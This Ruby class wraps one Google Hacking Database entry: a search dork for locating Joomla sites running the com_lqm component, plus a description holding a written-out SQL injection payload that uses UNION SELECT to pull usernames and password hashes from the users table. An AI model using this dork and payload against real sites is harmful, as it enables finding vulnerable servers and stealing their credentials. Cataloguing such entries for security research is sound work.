module Dorks
   class Dork3628 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3628",
            ghdb_url: "https://www.exploit-db.com/ghdb/3628",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2010-12-05",
            author: "anonymous",
            dork: <<~EDORK,
inurl:index.php?option=com_lqm "showResults"
EDORK
            description: <<~EDESC
Submitter: Snakespc SQL Injection: http://server/index.php?option=com_lqm&query=7&task=showResults&Itemid=158&lang=en&lqm_individual_id=-223+UNION SELECT 1,2,3,4,5,concat(username,0x3a,password),7,8,9,10,11,12+from+cil_site.jos_us
EDESC
         })

      end
   end
end
